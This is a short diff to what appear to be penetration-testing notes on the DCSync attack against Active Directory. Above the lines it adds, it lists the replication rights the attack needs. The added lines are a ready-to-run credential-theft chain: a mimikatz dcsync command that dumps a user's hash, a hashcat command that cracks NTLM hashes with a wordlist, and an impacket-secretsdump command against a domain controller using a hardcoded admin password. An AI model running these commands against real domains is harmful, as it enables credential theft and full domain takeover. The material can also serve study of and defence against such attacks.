@@ -3,3 +3,13 @@ user needs to have:
 -Replicating Directory Changes All
 -Replicating Directory Changes in Filtered Set
 Domain Admins, Enterprise Admins, and Administrators groups have these rights by default.
+
+
+.\mimikatz.exe
+lsadump::dcsync /user:superalex\user01
+
+# now we can for Hash NTLM 1000:
+hashcat -m 1000 hash.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+
+# As we can be domadmins:
+impacket-secretsdump -just-dc-user user01 superalex.sec/domadmin:"SecretPass23\!"@10.0.0.2
